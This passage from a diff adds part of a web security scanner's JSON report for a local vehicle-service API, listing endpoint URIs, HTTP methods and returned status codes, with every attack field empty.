+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "89",
+							"uri": "http://host.docker.internal:5183/api/ServiceRecords/vehicle/7519821612619880405",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/ServiceRecords\/vehicle\/7519821612619880405",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "46",
+							"uri": "http://host.docker.internal:5183/api/ServiceRecords/vehicle/vehicleId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/ServiceRecords\/vehicle\/vehicleId",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9366",
+							"uri": "http://host.docker.internal:5183/api/ServiceRecords/vehicle/vehicleId/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/ServiceRecords\/vehicle\/vehicleId\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "757",
+							"uri": "http://host.docker.internal:5183/api/Support",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9369",
+							"uri": "http://host.docker.internal:5183/api/Support/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "90",
+							"uri": "http://host.docker.internal:5183/api/Support/5741153256253280699",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/5741153256253280699",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "763",
+							"uri": "http://host.docker.internal:5183/api/Support/admin",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9371",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "91",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/91363646937834290",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/91363646937834290",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "772",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/conversation",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/conversation",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9372",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/conversation/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/conversation\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "92",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/conversation/4637757442109866217",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/conversation\/4637757442109866217",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "53",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/conversation/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/conversation\/userId",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9374",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/conversation/userId/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/conversation\/userId\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "52",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/conversations",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/conversations",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9373",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/conversations/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/conversations\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "788",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9376",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "93",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/503993945828212946",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/503993945828212946",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "50",
+							"uri": "http://host.docker.internal:5183/api/Support/my-messages?skip=0&take=30",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/my-messages (skip,take)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9377",
+							"uri": "http://host.docker.internal:5183/api/Support/my-messages/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/my-messages\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "48",
+							"uri": "http://host.docker.internal:5183/api/Support/ticket-status",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/ticket-status",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9380",
+							"uri": "http://host.docker.internal:5183/api/Support/ticket-status/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/ticket-status\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "49",
+							"uri": "http://host.docker.internal:5183/api/Support/unread-count",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/unread-count",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9378",
+							"uri": "http://host.docker.internal:5183/api/Support/unread-count/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/unread-count\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "802",
+							"uri": "http://host.docker.internal:5183/api/Uploads",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Uploads",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9382",
+							"uri": "http://host.docker.internal:5183/api/Uploads/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Uploads\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "94",
+							"uri": "http://host.docker.internal:5183/api/Uploads/4155547627733270982",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Uploads\/4155547627733270982",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "810",
+							"uri": "http://host.docker.internal:5183/api/Uploads/image",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Uploads\/image",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "9384",
+							"uri": "http://host.docker.internal:5183/api/Uploads/image/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Uploads\/image\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "95",
+							"uri": "http://host.docker.internal:5183/api/Uploads/image/2399957020930899529",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Uploads\/image\/2399957020930899529",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "816",
+							"uri": "http://host.docker.internal:5183/api/Users",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Users",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9386",
+							"uri": "http://host.docker.internal:5183/api/Users/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Users\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "96",
+							"uri": "http://host.docker.internal:5183/api/Users/344794158616715033",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Users\/344794158616715033",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "58",
+							"uri": "http://host.docker.internal:5183/api/Users/me",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Users\/me",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9387",
+							"uri": "http://host.docker.internal:5183/api/Users/me/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Users\/me\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "97",
+							"uri": "http://host.docker.internal:5183/api/Users/me/2590378835717001317",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Users\/me\/2590378835717001317",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "822",
+							"uri": "http://host.docker.internal:5183/api/Users/me/phone",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Users\/me\/phone",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9388",
+							"uri": "http://host.docker.internal:5183/api/Users/me/phone/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Users\/me\/phone\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "98",
+							"uri": "http://host.docker.internal:5183/api/Users/me/phone/5188839521969137841",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Users\/me\/phone\/5188839521969137841",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "826",
+							"uri": "http://host.docker.internal:5183/api/Vehicles",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Vehicles",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9390",
+							"uri": "http://host.docker.internal:5183/api/Vehicles/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Vehicles\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "99",
+							"uri": "http://host.docker.internal:5183/api/Vehicles/5387084360570061736",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Vehicles\/5387084360570061736",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "63",
+							"uri": "http://host.docker.internal:5183/api/Vehicles/my-vehicles",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Vehicles\/my-vehicles",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9391",
+							"uri": "http://host.docker.internal:5183/api/Vehicles/my-vehicles/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Vehicles\/my-vehicles\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "100",
+							"uri": "http://host.docker.internal:5183/api/Vehicles/my-vehicles/5736065984748932149",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Vehicles\/my-vehicles\/5736065984748932149",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "405",
+							"otherinfo": ""
+						},
+						{
+							"id": "65",
+							"uri": "http://host.docker.internal:5183/api/Vehicles/search?vehicleNumber=vehicleNumber&chassisNumber=chassisNumber",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Vehicles\/search (chassisNumber,vehicleNumber)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9393",
+							"uri": "http://host.docker.internal:5183/api/Vehicles/search/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Vehicles\/search\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "828",
+							"uri": "http://host.docker.internal:5183/api/workflows",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9395",
+							"uri": "http://host.docker.internal:5183/api/workflows/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "101",
+							"uri": "http://host.docker.internal:5183/api/workflows/6161709198689458637",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/6161709198689458637",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "840",
+							"uri": "http://host.docker.internal:5183/api/workflows/id",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/id",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9397",
+							"uri": "http://host.docker.internal:5183/api/workflows/id/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/id\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "102",
+							"uri": "http://host.docker.internal:5183/api/workflows/id/4201345902450099643",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/id\/4201345902450099643",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "71",
+							"uri": "http://host.docker.internal:5183/api/workflows/id/details",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/id\/details",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9396",
+							"uri": "http://host.docker.internal:5183/api/workflows/id/details/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/id\/details\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "70",
+							"uri": "http://host.docker.internal:5183/api/workflows/id/status",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/id\/status",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "400",
+							"otherinfo": ""
+						},
+						{
+							"id": "9400",
+							"uri": "http://host.docker.internal:5183/api/workflows/id/status/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/id\/status\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "400",
+							"otherinfo": ""
+						},
+						{
+							"id": "68",
+							"uri": "http://host.docker.internal:5183/api/workflows/logs",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/logs",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9399",
+							"uri": "http://host.docker.internal:5183/api/workflows/logs/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/logs\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "853",
+							"uri": "http://host.docker.internal:5183/api/workflows/my-workflows",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/my-workflows",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9402",
+							"uri": "http://host.docker.internal:5183/api/workflows/my-workflows/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/my-workflows\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "103",
+							"uri": "http://host.docker.internal:5183/api/workflows/my-workflows/5432600441561436591",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/my-workflows\/5432600441561436591",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "67",
+							"uri": "http://host.docker.internal:5183/api/workflows/my-workflows/vehicleId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/my-workflows\/vehicleId",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9403",
+							"uri": "http://host.docker.internal:5183/api/workflows/my-workflows/vehicleId/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/my-workflows\/vehicleId\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "69",
+							"uri": "http://host.docker.internal:5183/api/workflows/pending-approval",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/pending-approval",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9401",
+							"uri": "http://host.docker.internal:5183/api/workflows/pending-approval/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/pending-approval\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "863",
+							"uri": "http://host.docker.internal:5183/api/workflows/report-data",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/report-data",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9405",
+							"uri": "http://host.docker.internal:5183/api/workflows/report-data/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/report-data\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "104",
+							"uri": "http://host.docker.internal:5183/api/workflows/report-data/2499839205675500933",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/report-data\/2499839205675500933",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "72",
+							"uri": "http://host.docker.internal:5183/api/workflows/report-data/vehicleId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/report-data\/vehicleId",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9406",
+							"uri": "http://host.docker.internal:5183/api/workflows/report-data/vehicleId/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/report-data\/vehicleId\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "874",
+							"uri": "http://host.docker.internal:5183/api/workflows/verify",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/verify",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9408",
+							"uri": "http://host.docker.internal:5183/api/workflows/verify/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/verify\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "105",
+							"uri": "http://host.docker.internal:5183/api/workflows/verify/8825425599033455902",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/verify\/8825425599033455902",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "400",
+							"otherinfo": ""
+						},
+						{
+							"id": "75",
+							"uri": "http://host.docker.internal:5183/api/workflows/verify/workflowId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/verify\/workflowId",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "400",
+							"otherinfo": ""
+						},
+						{
+							"id": "9409",
+							"uri": "http://host.docker.internal:5183/api/workflows/verify/workflowId/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/workflows\/verify\/workflowId\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "400",
+							"otherinfo": ""
+						},
+						{
+							"id": "106",
+							"uri": "http://host.docker.internal:5183/swagger/9191914897337186037",
+							"nodeName": "http:\/\/host.docker.internal:5183\/swagger\/9191914897337186037",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "895",
+							"uri": "http://host.docker.internal:5183/swagger/v1",
+							"nodeName": "http:\/\/host.docker.internal:5183\/swagger\/v1",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9411",
+							"uri": "http://host.docker.internal:5183/swagger/v1/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/swagger\/v1\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "107",
+							"uri": "http://host.docker.internal:5183/swagger/v1/2623841468557111379",
+							"nodeName": "http:\/\/host.docker.internal:5183\/swagger\/v1\/2623841468557111379",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "42",
+							"uri": "http://host.docker.internal:5183/api/Notifications/id/read",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Notifications\/id\/read",
+							"method": "PATCH",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9310",
+							"uri": "http://host.docker.internal:5183/api/Notifications/id/read/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Notifications\/id\/read\/",
+							"method": "PATCH",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "13",
+							"uri": "http://host.docker.internal:5183/api/Auth/forgot-password-otp",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Auth\/forgot-password-otp ()({phoneNumber})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "400",
+							"otherinfo": ""
+						},
+						{
+							"id": "9314",
+							"uri": "http://host.docker.internal:5183/api/Auth/forgot-password-otp/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Auth\/forgot-password-otp\/ ()({phoneNumber})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "400",
+							"otherinfo": ""
+						},
+						{
+							"id": "16",
+							"uri": "http://host.docker.internal:5183/api/Auth/login",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Auth\/login ()({email,password})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9412",
+							"uri": "http://host.docker.internal:5183/api/Auth/login/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Auth\/login\/ ()({email,password})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8",
+							"uri": "http://host.docker.internal:5183/api/Auth/register",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Auth\/register ()({fullName,nic,phoneNumber,email,password,role})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "400",
+							"otherinfo": ""
+						},
+						{
+							"id": "9",
+							"uri": "http://host.docker.internal:5183/api/Auth/register-garage",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Auth\/register-garage ()(multipart:BusinessName,RegistrationNumber,FullName,Email,Password,ConfirmPassword,Phone,Address,Role,Latitude,Longitude,brDocument)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "400",
+							"otherinfo": ""
+						},
+						{
+							"id": "9300",
+							"uri": "http://host.docker.internal:5183/api/Auth/register-garage/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Auth\/register-garage\/ ()(multipart:BusinessName,RegistrationNumber,FullName,Email,Password,ConfirmPassword,Phone,Address,Role,Latitude,Longitude,brDocument)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "400",
+							"otherinfo": ""
+						},
+						{
+							"id": "9302",
+							"uri": "http://host.docker.internal:5183/api/Auth/register/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Auth\/register\/ ()({fullName,nic,phoneNumber,email,password,role})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "400",
+							"otherinfo": ""
+						},
+						{
+							"id": "15",
+							"uri": "http://host.docker.internal:5183/api/Auth/reset-password",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Auth\/reset-password ()({phoneNumber,newPassword})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "400",
+							"otherinfo": ""
+						},
+						{
+							"id": "9303",
+							"uri": "http://host.docker.internal:5183/api/Auth/reset-password/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Auth\/reset-password\/ ()({phoneNumber,newPassword})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "400",
+							"otherinfo": ""
+						},
+						{
+							"id": "6",
+							"uri": "http://host.docker.internal:5183/api/Auth/send-otp",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Auth\/send-otp ()({phoneNumber})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "400",
+							"otherinfo": ""
+						},
+						{
+							"id": "9301",
+							"uri": "http://host.docker.internal:5183/api/Auth/send-otp/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Auth\/send-otp\/ ()({phoneNumber})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "400",
+							"otherinfo": ""
+						},
+						{
+							"id": "14",
+							"uri": "http://host.docker.internal:5183/api/Auth/verify-forgot-password-otp",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Auth\/verify-forgot-password-otp ()({phoneNumber,otp})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "400",
+							"otherinfo": ""
+						},
+						{
+							"id": "9299",
+							"uri": "http://host.docker.internal:5183/api/Auth/verify-forgot-password-otp/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Auth\/verify-forgot-password-otp\/ ()({phoneNumber,otp})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "400",
+							"otherinfo": ""
+						},
+						{
+							"id": "7",
+							"uri": "http://host.docker.internal:5183/api/Auth/verify-otp",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Auth\/verify-otp ()({phoneNumber,otp})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "400",
+							"otherinfo": ""
+						},
+						{
+							"id": "9305",
+							"uri": "http://host.docker.internal:5183/api/Auth/verify-otp/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Auth\/verify-otp\/ ()({phoneNumber,otp})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "400",
+							"otherinfo": ""
+						},
+						{
+							"id": "17",
+							"uri": "http://host.docker.internal:5183/api/CheckupRequests",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/CheckupRequests ()({vehicleId,organizationId,requestedDate,requestedTime,ownerMessage})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9313",
+							"uri": "http://host.docker.internal:5183/api/CheckupRequests/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/CheckupRequests\/ ()({vehicleId,organizationId,requestedDate,requestedTime,ownerMessage})",
+							"method": "POST",
+							"param": "",
